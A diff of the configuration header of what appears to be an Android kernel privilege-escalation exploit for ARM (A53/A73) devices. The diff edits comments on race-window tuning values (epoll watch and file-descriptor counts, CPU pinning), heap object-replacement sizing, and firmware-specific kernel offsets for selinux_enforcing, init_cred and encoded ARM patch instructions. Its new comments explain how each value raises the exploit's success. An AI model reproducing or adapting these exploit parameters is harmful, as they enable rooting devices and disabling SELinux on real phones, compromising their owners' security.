@@ -40,16 +40,16 @@
 
 #define PFN_DOWN(x)	((x) >> PAGE_SHIFT)
 
-#define UNMAP_CPU 1 //1 A53 core, 4 A73 core
+#define UNMAP_CPU 1 		//1=A53 core, 4=A73 core
 
-#define UPDATE_CPU 0 //0 A53 core, 3 A73 core
+#define UPDATE_CPU 0 		//0=A53 core, 3=A73 core
 
-#define WAIT_CPU 2  //2
+#define WAIT_CPU 2  		//2
 
 #define NB_PREEMPT_THREAD 32
 
-#define NR_WATCHES  100 //5000 //100
-#define NR_EPFDS 500 //500
+#define NR_WATCHES  100 	//100-5000+  increases window size
+#define NR_EPFDS 500 		//500 increases window size
 
 #define TEST_ENT 3
 
@@ -57,11 +57,11 @@
 
 #define DEFAULT_WAIT 150
 
-#define CORRUPTED_VA_SIZE 500 //512
+#define CORRUPTED_VA_SIZE 500 	//500  increases success rate of object replacement
 
 #define CORRUPTED_COMMIT_SIZE 10 //10
 
-// PS7633/3445
+// PS7633/3445						//offset values from Cube kallsyms, subtract head t _head
 #define SELINUX_ENFORCING_7633_3445 0x185d634
 #define SEL_READ_HANDLE_UNKNOWN_7633_3445 0x3641d0
 #define INIT_CRED_7633_3445 0x15fb568
@@ -69,7 +69,7 @@
 #define ADD_INIT_7633_3445 0x9115a000			//add x0, x0, #0x568
 #define ADD_COMMIT_7633_3445 0x9132c108			//add x8, x8, #0xcb0
 
-// PS7646/3550
+// PS7646/3550						
 #define SELINUX_ENFORCING_7646_3550 0x185d634
 #define SEL_READ_HANDLE_UNKNOWN_7646_3550 0x3641d0
 #define INIT_CRED_7646_3550 0x15fb568
